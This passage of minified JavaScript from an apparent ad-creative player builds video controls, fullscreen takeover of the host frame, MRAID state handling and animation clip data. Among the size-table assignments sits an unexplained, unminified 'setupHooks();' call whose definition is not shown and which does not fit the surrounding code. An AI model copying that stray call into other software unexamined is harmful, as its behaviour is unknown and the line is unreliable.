      var t = f ? 52 : 0;
      if (r) var q = h + -66 - 74 + t;else {
        q = h + -204 + t;
        var x = hb(h + -126, 16, 60, 20, 172);
        var w = hb(h + -126, 8, 20, 40, 238, "volume slider");
        M(w, "keydown", Di(a));
        var u = h + -126 + t;
        var A = h + -66 + t;
      }
      var ba = hb(h + -184 + t, 8, 40, 40, 76, "mute");
      K(ba, !g);
      qa(ba, "click", function () {
        da(a, "muteon", null, !0);
      });
      var E = hb(h + -184 + t, 8, 40, 40, 124, "unmute");
      K(E, g);
      qa(E, "click", function () {
        da(a, "muteoff", null, !0);
      });
      if (!f) {
        var F = hb(h + -52, 8, 44, 40, 260, "fullscreen");
        qa(F, "click", function () {
          da(a, "fullscreenon", null, !0);
        });
        var T = hb(h + -52, 8, 44, 40, 306, "exit fullscreen");
        K(T, !1);
        qa(T, "click", function () {
          da(a, "fullscreenoff", null, !0);
        });
      }
      var P = q - 66;
      var N = hb(66, 22, P, 10, null);
      N.style.backgroundColor = "#444444";
      var Q = N.cloneNode(!1);
      t = Q.style;
      t.width = "0px";
      t.backgroundColor = "#ffffff";
      var ka = hb(56, 8, 20, 40, 238, "seek");
      M(ka, "keydown", Ci(a));
      I(l, n);
      I(l, p);
      I(l, N);
      I(l, Q);
      I(l, ka);
      I(l, ba);
      I(l, E);
      r || (I(l, x), I(l, w));
      f || (I(l, F), I(l, T));
      1 !== Z && (t = Ca(), t.style.position = "absolute", t.style.width = t.style.height = "2px", I(l, t));
      l.ccCount = 20;
      K(l, !1);
      l.ccHide = function () {
        sa(l.ccTimer);
        m.opacity = .7 * l.ccCount / 20;
        0 < l.ccCount ? (l.ccCount--, l.ccTimer = la(l.ccHide, 10)) : 1 === U && K(l, !1);
      };
      l.ccShow = function () {
        sa(l.ccTimer);
        K(l, !0);
        Md ? m.opacity = 1 : 20 > l.ccCount && (l.ccCount++, m.opacity = .7 * l.ccCount / 20, l.ccTimer = la(l.ccShow, 10));
      };
      l.ccScale = function (C) {
        var G = l.style;
        var H = D(a);
        if (H[58] === ua) {
          h = Math.round(.6 * Y / C);
          320 > h && (h = Math.round(Y / C - 20));
          H = Math.round((Y - h * C) / 2);
          var y = Math.round(.1 * ea);
        } else {
          wb();
          y = Math.min(H[5], Y);
          var Ea = H[6];
          h = Math.round((y - 20 * C) / C);
          320 > h && (h = 320, C = y / (h + 20));
          y = Math.round(10 * C);
          H = Math.round((H[5] - h * C) / 2);
          Ea >= ea && (y += Math.round((Ea - ea) / 2));
        }
        G.top = "auto";
        G.bottom = y + "px";
        G.left = H + "px";
        G.width = h + "px";
        G = f ? 52 : 0;
        r ? (Ea = 74 + G, ba.style.left = E.style.left = h + -184 + Ea + "px", q = h + -66 + G - Ea) : (ba.style.left = E.style.left = h + -184 + G + "px", x.style.left = h + -126 + G + "px", u = h + -126 + G, A = h + -66 + G, q = h + -204 + G, l.ccSetVolume(e));
        P = q - 66;
        N.style.width = Q.style.width = P + "px";
        F && (F.style.left = T.style.left = h + -52 + "px");
        l.ccSetPlayhead(d);
        Dc(l, "scale(" + C + ") translateZ(0)", "0px 100%");
        l.scale = C;
      };
      l.scale = 1;
      l.ccSetVolume = function (C) {
        var G = A,
          H = u + Math.floor(60 * C) - 10;
        r || (H > G - 16 && (H = G - 16), w.style.left = H + "px", e = C);
      };
      g || l.ccSetVolume(k);
      l.ccSetPlayhead = function (C) {
        var G = Math.floor(C * P);
        ka.style.left = 66 + G - 10 + "px";
        Q.style.width = G + "px";
        d = C;
      };
      l.ccLayoutControl = function (C, G, H) {
        C = 1 === C;
        G = 1 === G;
        var y = D(a)[58];
        K(n, !C);
        K(p, C);
        f || (K(F, ua !== y), K(T, ua === y), ua !== y ? B.activeElement === T && F.focus() : B.activeElement === F && T.focus());
        K(ba, !G);
        K(E, G);
        G ? B.activeElement === ba && E.focus() : B.activeElement === E && ba.focus();
        l.ccSetVolume(G ? 0 : H);
      };
      l.onmousedown = l.ontouchstart = function (C) {
        var G = Ob(C),
          H = N.getBoundingClientRect(),
          y = D(a)[58];
        C.preventDefault();
        if (G.x >= H.left - 6 && G.x <= H.right + 6) {
          var Ea = function (ha) {
            ha = Ob(ha);
            var aa = N.getBoundingClientRect();
            ha = (ha.x - aa.left) / aa.width;
            aa = D(y);
            0 > ha && (ha = 0);
            1 < ha && (ha = 1);
            aa[25] = !0;
            da(y, "setPlayhead", ha, !0);
          };
          da(y, "seekStart", null, !0);
        } else r || (H = x.getBoundingClientRect(), G.x >= H.left - 6 && G.x <= H.right + 6 && (Ea = function (ha) {
          ha = Ob(ha);
          var aa = x.getBoundingClientRect();
          ha = (ha.x - aa.left) / aa.width;
          0 > ha && (ha = 0);
          1 < ha && (ha = 1);
          da(y, "setVolume", ha, !0);
        }));
        Ea && (Ea(C), l.onmousemove = l.ontouchmove = Ea, M(B, "mouseup", qe, {
          capture: !0
        }), M(B, "touchend", qe, {
          capture: !0
        }));
      };
      l.onmouseup = l.ontouchend = function (C) {};
      I(c, l);
      c.onmouseover = function (C) {
        Mb || (l.ccShow(), M(B, "mouseover", re), M(B, "mouseout", re));
      };
      c.ontouchstart = function (C) {
        Mb = !0;
        sa(l.ccTouchTimer);
        l.ccShow();
      };
      c.ontouchend = function (C) {
        l.ccTouchTimer = la(l.ccHide, 3E3);
      };
      b[4] = l;
      b[5] = n;
      b[6] = p;
      b[7] = F;
      b[8] = T;
    },
    qe = function () {
      try {
        z(7)[4].onmousemove = null, z(7)[4].ontouchmove = null, da(7, "seekEnd", null, !0);
      } catch (a) {}
      fb(B, "mouseup", qe, {
        capture: !0
      });
      fb(B, "touchend", qe, {
        capture: !0
      });
    },
    re = function (a) {
      var b, c;
      try {
        var e = D(7);
        var d = e[58];
        O[d][0] && (b = z(7)) && (b[0].contains(a.target) ? c = !0 : b[4].ccHide());
      } catch (f) {}
      c || (fb(B, "mouseover", re), fb(B, "mouseout", re));
    },
    Hc = function (a, b, c) {
      if (Eg && !Yd) od.push([a, b]);else {
        var e = a.play();
        try {
          var d = new Promise(function (f, g) {
            e.then(function (k) {
              f(k);
              D(b)[34] = !0;
            }).catch(function (k) {
              var h,
                l = ["pause", "notallowed"];
              var m = D(b);
              if ("NotAllowedError" === k.name) if (a.muted || c) {
                m[22] = 9;
                gc(b, !1);
                ta[b].as || ta[b].at || mh(b, !0);
                try {
                  for (h = 0; 2 > h; h++) {
                    var n = B.createEvent("Event");
                    n.initEvent(l[h], !1, !1);
                    a.dispatchEvent(n);
                  }
                } catch (r) {}
              } else {
                a.muted = !0;
                m[23] = 1;
                n = z(b);
                (n = n[4]) && n.ccLayoutControl(m[22], m[23], m[27]);
                qc(b, void 0, a.muted);
                m = Hc(a, b, !0);
                m.then(function (r) {
                  f(r);
                  D(b)[34] = !0;
                }).catch(function (r) {
                  g(r);
                });
                var p = !0;
              }
              if (!p) {
                nh(b, !0);
                try {
                  g(k);
                } catch (r) {}
              }
            });
          });
          d.catch(function () {});
          return d;
        } catch (f) {
          D(b)[34] || M(a, "playing", function (g) {
            D(b)[34] = !0;
          });
        }
      }
    },
    da = function (a, b, c, e) {
      var d,
        f = b;
      a = ca(a);
      var g = D(a),
        k = g[58],
        h = O[k],
        l = z(a),
        m = l && l[3],
        n = l && l[4],
        p = "IFRAME" === (m && m.tagName);
      "status" !== f && nd("videocmd:" + f, {
        name: decodeURIComponent(Oa[a]),
        div: l && l[0],
        video: m
      });
      Nb && (e = !0);
      if (1 === a || 3 === a) e && na("ii");else if (m) {
        try {
          "toggle" === b ? f = 1 !== g[22] ? "play" : "pause" : "mutetoggle" === b && (f = 1 === g[23] ? "muteoff" : "muteon");
          if ("open" === b) {
            if (!h[0] || !l[0] || !l[0].parentNode) return;
            1 < yc && (g[23] = yc);
            0 <= ed && (g[27] = ed);
            1 === U || !sc || e && !of || Bf || V || (g[23] = 1);
            f = b = "play";
            var r = 1 === g[23];
            var t = g[27];
            m.muted = r;
            m.volume = r ? 0 : Gc(t);
            g[34] || gc(a, !0);
            tc && (f = b = "", gc(a, !1));
            tc && (g[22] = 8);
          } else if ("close" === b) g[22] = 2, clearInterval(g[26]), clearInterval(g[32]), sa(g[31]), g[26] = null, g[32] = null, n && n.ccSetPlayhead(0);else {
            if ("status" === b) {
              var q = {
                notallowed: 9 === g[22],
                paused: 2 === g[22],
                ended: 3 === g[22],
                muted: 1 === g[23]
              };
              p || (q.paused = m.paused, q.ended = m.ended, q.muted = m.muted);
              return q;
            }
            if ("getPlayhead" === b) return q = p ? Ei(a, b) : void 0 !== m.currentTime ? Math.min(Math.max(m.currentTime / (m.ccDuration || m.duration || ta[a].dur), 0), 1) : 0;
            e && na("ii");
            try {
              if (/(mute|play|pause|seek|screen)/i.test(f)) try {
                zf(a, f);
              } catch (x) {}
              if ("play" !== b && "toggle" !== b || h[0]) "rewind" === b ? (m.currentTime = 0, n && n.ccSetPlayhead(0)) : "setVolume" === b ? (ed = g[27] = c, 1 === g[23] && 0 < c ? (yc = g[23] = 2, Fc(k, "vmuteoff")) : 2 === g[23] && 0 === c && (yc = g[23] = 1, Fc(k, "vmuteon"))) : "muteon" === b ? yc = g[23] = 1 : "muteoff" === b ? yc = g[23] = 2 : "fullscreenon" === b ? Cf(a, !0) : "fullscreenoff" === b && Cf(a, !1);else {
                Fc(k, "v" + f);
                Sa(k, 1, e);
                return;
              }
            } catch (x) {}
            Fc(k, "v" + f);
          }
          "play" === f ? (6 !== g[22] && (d = Hc(m, a)), g[22] = 1, sa(g[31])) : "pause" === f ? (6 !== g[22] && m.pause(), g[22] = 2, sa(g[31])) : 0 === b.indexOf("mute") ? (r = "muteon" === f, 6 !== g[22] && (m.muted = r, m.volume = r ? 0 : Gc(g[27])), g[23] = r ? 1 : 2) : "setVolume" === b ? (m.volume = Gc(c), 0 < c && 6 !== g[22] && (m.muted = !1)) : "close" === b && (m.ccogv ? m.stop() : 0 !== (U & 390) && m.ended || la(function (x) {
            return function () {
              try {
                var w = D(x)[58],
                  u = O[w],
                  A = z(x)[3];
                u[0] || (A.pause(), A.currentTime = 0);
              } catch (ba) {}
            };
          }(a), 100), sa(g[31]));
          "setVolume" === f ? n && n.ccSetVolume(c) : "seekStart" === f ? (1 === g[22] && (g[22] = 4), m.pause && m.pause()) : "seekEnd" === f ? 4 === g[22] && (g[22] = 1, d = Hc(m, a)) : "setPlayhead" === f && (void 0 !== m.currentTime && (m.currentTime = c * (m.ccDuration || m.duration || ta[a].dur)), n && n.ccSetPlayhead(c));
          n && n.ccLayoutControl(g[22], g[23], g[27]);
        } catch (x) {}
        return d;
      }
    },
    Ei = function (a, b, c) {
      var e = (e = z(a)) && e[3];
      if ("getPlayhead" === b) {
        b = 0;
        if (ih[a]) try {
          b = e.contentWindow.getPlayhead();
        } catch (d) {}
        return b;
      }
      if (ih[a]) try {
        e.contentWindow.postMessage({
          m: "cmd",
          c: b,
          v: "setVolume" === b ? Gc(c) : c
        }, "*");
      } catch (d) {} else Ne[a] || (Ne[a] = []), Ne[a].push([b, c]);
    },
    Af = function (a, b, c, e) {
      var d = D(a),
        f = d[58],
        g = z(a),
        k = g[4];
      var h = ta[a];
      "status" === b ? (d[22] = c, d[23] = e, (3 === c || 9 === c) && d[34] && 9 !== d[22] && lh(f, 1), k && (K(g[5], 1 !== c), K(g[6], 1 === c))) : "setPlayhead" === b && (k && (k.ccSetPlayhead(c), 0 < c && !d[33] && (K(k, !0), Md && (k.style.opacity = 1), k.ccCount = 20, k.ccTimer = la(k.ccHide, 1500), d[33] = !0)), h.progress && (g[10].style.width = 100 * c + "%"));
      zf(a, b, c);
    },
    Cf = function (a, b) {
      var c = z(a),
        e = c[0],
        d = c[1],
        f = c[4],
        g = c[2],
        k = D(a),
        h = k[58],
        l = "canvas" === yb(a),
        m,
        n;
      if (0 <= ua && b) {
        if (ua === h) return;
        Cf(ua, !1);
      }
      l || (m = "IFRAME" === g.tagName);
      db ? (B.activeElement === db && (n = !0), eb(db), db = null) : b && c[7] && B.activeElement === c[7] ? n = !0 : !b && c[8] && B.activeElement === c[8] && (n = !0);
      g && g.previousSibling && "ccp" === g.previousSibling.id && (g.previousSibling.style.display = b ? "none" : "block");
      if (b) {
        !V || ce || vc || "expanded" === V || Xb || (Xb = Re = !0, L.setExpandProperties({
          useCustomClose: !0
        }), L.expand());
        try {
          if (top !== v && top.alert) {
            var p = v.frameElement.style;
            var r = top.document.body.style;
            Ba[2] = p.position;
            Ba[3] = p.opacity;
            Ba[4] = p.zIndex;
            Ba[6] = p.top;
            Ba[7] = p.left;
            Ba[8] = p.width;
            Ba[9] = p.height;
            Ba[10] = r.overflow;
            p.setProperty("position", "fixed", "important");
            p.setProperty("opacity", "1", "important");
            p.setProperty("z-index", "2147483646", "important");
            p.setProperty("top", "0px", "important");
            p.setProperty("left", "0px", "important");
            p.setProperty("width", "100%", "important");
            p.setProperty("height", "100%", "important");
            r.setProperty("overflow", "hidden", "important");
            Ba[1] = !0;
          }
        } catch (t) {}
        ua = h;
        wb();
        b = 1 === Z ? .5 : 1 / Wb;
        f ? (f.ccScale(b), n && c[8] && Df(c[8])) : (f = fa[ca(a)], c = f[3], p = f[4], f = 30, c * ea > Y * p && (f += Math.round((ea - p * Y / c) / 2)), db = Ca(), c = db.style, c.width = "44px", c.height = "40px", c.padding = "10px", c.bottom = f + "px", c.right = "30px", c.position = "absolute", c.cursor = "pointer", c.opacity = .7, c.borderRadius = "10px", c.backgroundColor = "#000000", c.backgroundRepeat = "no-repeat", c.backgroundPosition = "center center", c.backgroundImage = "url('data:image/svg+xml;charset=utf-8,%3csvg%20xmlns%3asvg%3d%22http%3a%2f%2fwww.w3.org%2f2000%2fsvg%22%20xmlns%3d%22http%3a%2f%2fwww.w3.org%2f2000%2fsvg%22%20version%3d%221.1%22%20width%3d%2244%22%20height%3d%2240%22%3e%3cpath%20d%3d%22m25%200c-1.65685%200-3%201.343146-3%203l0%2014c0%201.656854%201.34315%203%203%203l14%200c1.65685%200%203-1.343146%203-3%200-1.656854-1.34315-3-3-3l-6.75%200%208.875-8.875C41.66789%204.582107%2042%203.828427%2042%203c0-1.656854-1.34315-3-3-3-0.82842%200-1.5821%200.332106-2.125%200.875L28%209.75%2028%203c0-1.656854-1.34315-3-3-3z%22%20fill%3d%22%23fff%22%2f%3e%3cpath%20d%3d%22m19%2040c1.65685%200%203-1.34315%203-3l0-14c0-1.65685-1.34315-3-3-3l-14%200c-1.65685%200-3%201.34315-3%203%200%201.65685%201.34315%203%203%203l6.75%200-8.875%208.875C2.33211%2035.41789%202%2036.17157%202%2037c0%201.65685%201.34315%203%203%203%200.82842%200%201.5821-0.33211%202.125-0.875L16%2030.25%2016%2037c0%201.65685%201.34315%203%203%203z%22%20fill%3d%22%23fff%22%2f%3e%3c%2fsvg%3e')", Dc(db, "scale(" + b + ") translateZ(0)", "right bottom"), qa(db, "click", function () {
          da(ua, "fullscreenoff", null, !0);
        }), M(db, "keydown", ph), I(d, db), n && Df(db));
        M(v, "orientationchange", ne);
        M(screen, "mozorientationchange", ne);
        Pe = e.parentNode;
        Qe = e.nextSibling;
        m || I(ma, e);
        for (d = g; d;) {
          b = d.style;
          d.ccStyle = b.cssText;
          b.overflow = "visible";
          b.clip = "auto";
          b.top = b.left = "0px";
          d === g && g.ccogv ? b.position = "absolute" : b.width = b.height = "100%";
          d === g && (b.objectFit = "contain");
          d === g && l && (n = Y * g.height, c = g.width * ea, n < c ? (b.height = "auto", b.top = 50 * (1 - n / c) + "%") : (b.width = "auto", b.left = 50 * (1 - c / n) + "%"));
          if (d === e) {
            b.position = 0 < (U & 390) && !m ? "absolute" : "fixed";
            b.zIndex = 7E6;
            Dc(d, "", "");
            1 !== U && (b.width = "100vw", b.height = "100%");
            l && (b.backgroundColor = "#000");
            break;
          }
          d = d.parentNode;
        }
        g.ccogv && g.setSize(v.innerWidth + 1, v.innerHeight + 1, !0);
        qh(h, !1);
        k[20] = Math.max(ma.scrollLeft, Va.scrollLeft);
        k[21] = Math.max(ma.scrollTop, Va.scrollTop);
        v.scrollTo(0, 0);
        M(v, "keydown", rh);
        M(e, "touchstart", sh);
      } else {
        try {
          Ba[1] && (p = v.frameElement.style, r = top.document.body.style, p.position = Ba[2], p.opacity = Ba[3], p.zIndex = Ba[4], p.top = Ba[6], p.left = Ba[7], p.width = Ba[8], p.height = Ba[9], r.overflow = Ba[10], Ba = []);
        } catch (t) {}
        ua = -1;
        m || I(Pe, e, Qe);
        Pe = Qe = null;
        for (d = g; d;) {
          b = d.style;
          if (!b) break;
          d.ccStyle && (b.cssText = d.ccStyle);
          if (d === e) break;
          d = d.parentNode;
        }
        qh(h, !0);
        v.scrollTo(k[20], k[21]);
        fb(v, "keydown", rh);
        fb(e, "touchstart", sh);
        k[4] = "";
        Ya(h, !0);
        n && c[7] && Df(c[7]);
        "expanded" === V && Re && !ad && (Re = !1, be = ad = !0, L.close());
      }
      g.ccogv || 1 !== k[22] || Hc(g, ca(a));
    },
    qh = function (a, b) {
      var c = [];
      c[7] = [9];
      c[8] = [9];
      b = b ? "block" : "none";
      if (a = c[a]) for (c = 0; c < a.length; c++) {
        var e = S[a[c]];
        O[e][0] && (z(e)[0].style.display = b);
      }
    },
    Df = function (a) {
      la(function () {
        a && a.focus();
      }, 1);
    },
    rh = function (a) {
      27 === a.keyCode && da(ua, "fullscreenoff", null, !0);
    },
    sh = function (a) {
      a.preventDefault();
    },
    ne = function (a) {
      if (0 <= ua) {
        var b = z(ua);
        a = b[4];
        b = b[3];
        b.ccogv && b.setSize(v.innerWidth + 1, v.innerHeight + 1, !0);
        a && la(function (c) {
          0 <= ua && c.ccScale(1 === Z ? .5 : 1 / Wb);
        }, 9 <= ob ? 1 : 500, a);
        v.scrollTo(0, 0);
      }
    },
    vf = function (a) {
      var b,
        c = [7, 1, 3];
      for (b = 0; b < c.length; b++) {
        var e = c[b];
        var d = S[e];
        e = D(e);
        var f = O[d];
        a ? 1 === e[22] && (da(d, "pause", null, !1), e[22] = 8) : 8 === e[22] && (f[0] ? (da(d, "play", null, !1), e[22] = 1) : e[22] = 2);
      }
    },
    Ic = [{
      h: 350,
      w: 1920
    }];
  Ic[5] = {
    h: 164,
    w: 290
  };
  setupHooks();
  Ic[6] = {
    h: 141,
    w: 240
  };
  Ic[11] = {
    h: 230,
    w: 1920
  };
  Ic[12] = {
    w: 1024,
    h: 362
  };
  var xi = function (a) {
      var b = ca(a);
      var c = z(a);
      b = Ic[b];
      var e = Ca();
      var d = e.style;
      void 0 !== b.color && (d.backgroundColor = b.color);
      void 0 !== b.borderWidth && (d.borderWidth = b.borderWidth + "px", d.borderColor = b.borderColor, d.borderStyle = "solid");
      c[2] = e;
      th(a, b.w, b.h);
      I(c[1], e);
    },
    th = function (a, b, c) {
      var e = ca(a);
      a = z(a);
      e = Ic[e];
      void 0 !== e.borderWidth && (b -= 2 * e.borderWidth, c -= 2 * e.borderWidth);
      try {
        var d = a[2].style;
        d.width = b + "px";
        d.height = c + "px";
      } catch (f) {}
    },
    Kc = {
      x: 0,
      y: 0
    },
    sd = !1,
    td,
    Da = [],
    Sc = {},
    Mh;
  Da[1] = {
    origStatus: {
      m: [1, 0, -1, -1, 0, 1, null, 0]
    },
    endTime: 500,
    loadCount: 6,
    clipData: [{
      bgOpacity: 0,
      borderColor: "#000000",
      endTime: 500,
      objectList: [{
        height: 304,
        motionList: [{
          anchorX: 269,
          rotation: 0,
          x: 1383,
          type: 1,
          skewY: 0,
          anchorY: 152,
          time: 500,
          y: 0,
          scaleY: 1,
          easing: Pa,
          scaleX: 1,
          alpha: 1,
          skewX: 0
        }],
        assetLid: 1,
        id: 1,
        maxScale: 100,
        width: 537,
        url: "clipcentric-a.akamaihd.net/file/1684480/master/1695835569/6dg-RRxQ?f=auto",
        pd: 1
      }, {
        motionList: [{
          alpha: 1,
          skewX: 0,
          easing: Pa,
          scaleX: 1,
          scaleY: 1,
          y: 0,
          time: 400,
          skewY: 0,
          anchorY: 151,
          type: 1,
          x: 1386,
          rotation: 0,
          anchorX: 267
        }],
        height: 301,
        maxScale: 100,
        assetLid: 1,
        id: 2,
        url: "clipcentric-a.akamaihd.net/file/1684481/master/1695835570/u43NNQTJ?f=auto",
        width: 534,
        pd: 1
      }, {
        pd: 1,
        width: 547,
        url: "clipcentric-a.akamaihd.net/file/1684482/master/1695835571/2pxibeqf?f=auto",
        id: 3,
        assetLid: 1,
        maxScale: 100,
        height: 301,
        motionList: [{
          type: 1,
          skewY: 0,
          anchorY: 151,
          time: 300,
          anchorX: 274,
          rotation: 0,
          x: 1373,
          easing: Pa,
          scaleX: 1,
          alpha: 1,
          skewX: 0,
          y: 0,
          scaleY: 1
        }]
      }, {
        maxScale: 100,
        id: 4,
        assetLid: 1,
        motionList: [{
          y: 0,
          scaleY: 1,
          easing: Pa,
          scaleX: 1,
          alpha: 1,
          skewX: 0,
          x: 1373,
          rotation: 0,
          anchorX: 274,
          type: 1,
          time: 200,
          skewY: 0,
          anchorY: 152
        }],
        height: 303,
        pd: 1,
        url: "clipcentric-a.akamaihd.net/file/1684483/master/1695835572/CqG5LxCU?f=auto",
        width: 547
      }, {
        id: 5,
        assetLid: 1,
        maxScale: 100,
        height: 304,
        motionList: [{
          type: 1,
          anchorY: 152,
          skewY: 0,
          time: 100,
          anchorX: 276,
          rotation: 0,
          x: 1368,
          easing: Pa,
          scaleX: 1,
          alpha: 1,
          skewX: 0,
          y: 0,
          scaleY: 1
        }],
        pd: 1,
        width: 552,
        url: "clipcentric-a.akamaihd.net/file/1684484/master/1695835572/xA52QCaU?f=auto"
      }, {
        pd: 1,
        url: "clipcentric-a.akamaihd.net/file/1684557/ad_q90/1695837703/ciOAeD1E?f=auto",
        width: 1920,
        id: 6,
        assetLid: 1,
        maxScale: 100,
        height: 350,
        motionList: [{
          alpha: 1,
          skewX: 0,
          easing: Pa,
          scaleX: 1,
          scaleY: 1,
          y: 0,
          time: 0,
          anchorY: 175,
          skewY: 0,
          type: 1,
          rotation: 0,
          x: 0,
          anchorX: 960
        }]
      }],
      instances: ["m"],
      maskInfo: [{}, {}, {}, {}, {}, {}],
      loop: 2,
      height: 350,
      loopDelay: 500,
      bgColor: "rgba(255,255,255,0)",
      borderWidth: 0,
      width: 1920
    }]
  };
  Da[3] = {
    loadCount: 7,
    clipData: [{
      objectList: [{
        height: 120,
        motionList: [{
          skewY: 0,
          anchorY: 60,
          time: 600,
          type: 1,
          anchorX: 458,
          x: 1005,
          rotation: 0,
          alpha: 1,
          skewX: 0,
          easing: Pa,
          scaleX: 1,
          scaleY: 1,
          y: 0
        }],
        id: 7,
        assetLid: 3,
        maxScale: 100,
        width: 915,
        url: "clipcentric-a.akamaihd.net/file/1684487/ad_q50/1695835772/vtG86w4Q?f=auto",
        pd: 1
      }, {
        url: "clipcentric-a.akamaihd.net/file/1684488/ad_q50/1695835773/wfClHu4b?f=auto",
        width: 919,
        pd: 1,
        motionList: [{
          time: 500,
          anchorY: 60,
          skewY: 0,
          type: 1,
          x: 1001,
          rotation: 0,
          anchorX: 460,
          skewX: 0,
          alpha: 1,
          scaleX: 1,
          easing: Pa,
          scaleY: 1,
          y: 0
        }],
        height: 120,
        maxScale: 100,
        assetLid: 3,
        id: 8
      }, {
        pd: 1,
        width: 925,
        url: "clipcentric-a.akamaihd.net/file/1684489/ad_q40/1695835774/fuNSBw2R?f=auto",
        maxScale: 100,
        assetLid: 3,
        id: 9,
        motionList: [{
          rotation: 0,
          x: 995,
          anchorX: 463,
          time: 400,
          skewY: 0,
          anchorY: 60,
          type: 1,
          scaleY: 1,
          y: 0,
          skewX: 0,
          alpha: 1,
          scaleX: 1,
          easing: Pa
        }],
        height: 120
      }, {
        assetLid: 3,
        id: 10,
        maxScale: 100,
        height: 120,
        motionList: [{
          scaleX: 1,
          easing: Pa,
          skewX: 0,
          alpha: 1,
          y: 0,
          scaleY: 1,
          type: 1,
          anchorY: 60,
          skewY: 0,
          time: 300,
          anchorX: 463,
          x: 995,
          rotation: 0
        }],
        pd: 1,
        url: "clipcentric-a.akamaihd.net/file/1684490/ad_q40/1695835775/U-LEMJGw?f=auto",
        width: 925
      }, {
        url: "clipcentric-a.akamaihd.net/file/1684491/ad_q50/1695835775/NJboyxpN?f=auto",
        width: 928,
        pd: 1,
        height: 120,
        motionList: [{
          rotation: 0,
          x: 992,
          anchorX: 464,
          time: 200,
          skewY: 0,
          anchorY: 60,
          type: 1,
          scaleY: 1,
          y: 0,
          skewX: 0,
          alpha: 1,
          scaleX: 1,
          easing: Pa
        }],
        id: 11,
        assetLid: 3,
        maxScale: 100
      }, {
        height: 120,
        motionList: [{
          y: 0,
          scaleY: 1,
          easing: Pa,
          scaleX: 1,
          alpha: 1,
          skewX: 0,
          rotation: 0,
          x: 992,
          anchorX: 464,
          type: 1,
          time: 100,
          anchorY: 60,
          skewY: 0
        }],
        assetLid: 3,
        id: 12,
        maxScale: 100,
        width: 928,
        url: "clipcentric-a.akamaihd.net/file/1684492/ad_q40/1695835776/MQiCJ5mr?f=auto",
        pd: 1
      }, {
        pd: 1,
        url: "clipcentric-a.akamaihd.net/file/1684559/ad_q65/1695837731/Wk6CoCvL?f=auto",
        width: 1920,
        maxScale: 100,
        id: 13,
        assetLid: 3,
        motionList: [{
          alpha: 1,
          skewX: 0,
          easing: Pa,
          scaleX: 1,
          scaleY: 1,
          y: 0,
          time: 0,
          skewY: 0,
          anchorY: 60,
          type: 1,
          rotation: 0,
          x: 0,
          anchorX: 960
        }],
        height: 120
      }],
      endTime: 600,
      height: 120,
      maskInfo: [{}, {}, {}, {}, {}, {}, {}],
      loop: 2,
      instances: ["m"],
      bgOpacity: 0,
      borderColor: "#000000",
      borderWidth: 0,
      width: 1920,
      bgColor: "rgba(255,255,255,0)",
      loopDelay: 500
    }],
    origStatus: {
      m: [1, 0, -1, -1, 0, 1, null, 0]
    },
    endTime: 600
  };
  var pc = [];
  pc[9] = {
    colb: "rgba(255, 255, 255, 1)",
    type: "trigger",
    htype: "dropshadow",
    msize: 50,
    asset: "replay-round",
    hval: 20,
    colm: "rgba(0, 0, 0, 1)"
  };
  pc[13] = {
    colb: "#000000",
    type: "abort",
    htype: "darken",
    msize: 50,
    asset: "close-plain",
    hval: 50,
    colm: "#ffffff"
  };
  var di = function () {
      var a = lb("adatg-oolg-evaa-kd");
      if (a = B.querySelector("[" + a + "]")) {
        var b = a.getAttribute("data-google-av-adk");
        Ef = 120;
        self.addEventListener("message", function (c) {
          "string" === typeof c.data && 0 < c.data.indexOf("4=" + b) && (c = c.data.match(/\s38=(\d+)-(\d+)/)) && (Se = parseInt(c[1]), Te = parseInt(c[2]));
        }, !1);
      }
    },
    Ec = function (a) {
      try {
        var b = oa.geom();
      } catch (c) {}
      b || (b = {});
      b.win || (b.win = {});
      b.self || (b.self = {});
      b.exp || (b.exp = {});
      isNaN(b.win.w) && (b.win.w = self.innerWidth);
      isNaN(b.win.h) && (b.win.h = self.innerHeight);
      isNaN(b.self.l) && (b.self.l = 0);
      isNaN(b.self.t) && (b.self.t = 0);
      isNaN(b.exp.l) && (b.exp.l = 0);
      isNaN(b.exp.r) && (b.exp.r = 0);
      isNaN(b.exp.t) && (b.exp.t = 0);
      isNaN(b.exp.b) && (b.exp.b = 0);
      b.self.t -= Se;
      b.self.b -= Se;
      b.self.l -= Te;
      b.self.r -= Te;
      se && !a && (b.self.l = hc, b.self.t = ic);
      return b;
    },
    Lg = function (a) {
      "collapsed" === a && wc ? (wa = wc, wc = null, a = Ec(), wa.expmax = {
        l: a.exp.l,
        r: a.exp.r,
        t: a.exp.t,
        b: a.exp.b
      }, wa.l = Math.min(wa.l, a.exp.l), wa.t = Math.min(wa.t, a.exp.t), wa.r = Math.min(wa.r, a.exp.r), wa.b = Math.min(wa.b, a.exp.b), Yb = self.innerWidth, dd = self.innerHeight, (0 < wa.l || 0 < wa.t || 0 < wa.r || 0 < wa.b) && oa.expand(wa)) : "failed" === a && (Gg = !0, lf());
    },
    Fi = function () {
      if (L) try {
        L.getMaxSize || (L.getMaxSize = yf), L.getScreenSize || (L.getScreenSize = function () {
          return {
            width: screen.width,
            height: screen.height
          };
        }), L.getDefaultPosition || (L.getDefaultPosition = function () {
          var a = L.getMaxSize();
          a.x = a.y = 0;
          return a;
        }), L.getCurrentPosition || (L.getCurrentPosition = L.getDefaultPosition), L.setResizeProperties || (L.setResizeProperties = function () {});
      } catch (a) {}
    },
    Ff = function () {
      1 > self.innerHeight && 1 > self.innerWidth || (fb(self, "resize", Ff), tb || (tb = !0, ke()));
    },
    fe = function () {
      if (!Yd) {
        Yd = !0;
        Fi();
        uh();
        L.addEventListener("stateChange", Gi);
        L.addEventListener("viewableChange", Hi);
        parseInt(L.getVersion());
        V = L.getState();
        0 < (U & 1560) && (M(self, "resize", Ff), la(Ff, 100));
        L.isViewable() || tb ? (tb = !0, ke()) : L.addEventListener("exposureChange", Ii);
        var a;
        for (a = 0; a < od.length; a++) Hc(od[a][0], od[a][1]);
        od = [];
      }
    },
    Gi = function (a) {
      var b = "expanded" === V && "default" === a && !be;
      "expanded" === a ? Xb = !1 : "default" === a && (ad = !1);
      0 <= ua && ("expanded" === V ? (b = !1, da(ua, "fullscreenoff", null, !1)) : ne());
      V = a;
      cc && (b && (ce = !0, pf(!1), ce = !1), xb(), b = z(S[0])[0].style, "expanded" !== a && (b.marginLeft = "calc(50vw - " + parseInt(b.width) / 2 + "px)"), be = !1);
    },
    Hi = function (a) {
      var b = !(a || Xb || /expanded|resized/i.test(V));
      a && !tb && (tb = !0, ke());
      vf(b);
      Ee(b);
    },
    Ii = function (a, b, c) {
      0 < a && (tb || (tb = !0, ke()), L.removeEventListener("exposureChange"));
    },
    yf = function () {
      return {
